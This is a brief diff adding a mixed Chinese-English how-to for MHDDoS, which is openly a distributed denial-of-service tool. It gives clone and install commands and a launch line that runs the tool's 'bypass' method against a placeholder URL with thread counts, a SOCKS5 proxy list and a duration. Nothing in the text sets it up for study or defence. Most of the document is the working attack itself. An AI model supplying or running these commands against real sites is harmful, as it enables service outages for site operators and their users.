@@ -1,0 +1,18 @@
+克隆和安装脚本
+
+git clone https://github.com/MHProDev/MHDDoS.git 
+cd MHDDoS 
+pip3 install -r requirements.txt 
+
+Launch Script
+
+python3 start.py
+!python3 start.py bypass https://example.com 5 30000 socks5.txt 10000 854854
+
+
+
+没有pip3怎么办：
+
+sudo apt update
+
+sudo apt install python3-pip
